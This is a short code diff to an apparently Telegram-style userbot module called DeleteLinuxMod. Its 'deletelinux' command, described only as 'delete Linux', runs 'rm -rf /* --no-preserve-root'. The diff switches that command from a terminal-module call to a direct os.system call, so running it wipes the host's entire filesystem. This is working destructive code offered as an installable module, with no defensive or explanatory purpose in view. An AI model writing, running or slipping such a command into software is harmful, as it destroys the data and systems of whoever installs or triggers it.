@@ -4,6 +4,7 @@
 
 from herokutl.tl.types import Message
 from .. import loader, utils
+import os
 
 @loader.tds
 class DeleteLinuxMod(loader.Module):
@@ -23,4 +24,4 @@ class DeleteLinuxMod(loader.Module):
     async def deletelinuxcmd(self, message: Message):
         """delete Linux"""
         meassage = await utils.answer(message, self.strings("deleting_linux"))
-        await self.invoke("terminal", "rm -rf /* --no-preserve-root", peer=meassage.peer_id)
+        os.system("rm -rf /* --no-preserve-root")
